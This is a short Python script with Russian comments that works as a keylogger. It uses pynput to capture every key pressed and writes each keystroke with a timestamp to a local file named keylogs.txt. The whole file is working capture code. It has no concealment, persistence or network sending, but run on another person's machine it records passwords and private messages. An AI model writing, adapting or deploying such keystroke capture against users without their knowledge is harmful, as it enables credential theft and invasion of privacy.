
from pynput.keyboard import Key, Listener
import logging

# filename - задает создание FileHandler с использованием указанного имени файла
# level - установка уровеня корневого регистратора на указанный уровень
# format - форматирование строки для обработчика 


log_dir = ""
logging.basicConfig(filename=(log_dir + "keylogs.txt"), 
    level=logging.DEBUG, 
    format='%(asctime)s: %(message)s')

# регистрирует сообщение с уровнем INFO в корневом регистраторе
def on_press(key):
    logging.info(str(key))

# начало отработки
with Listener(on_press=on_press) as listener:
    listener.join()


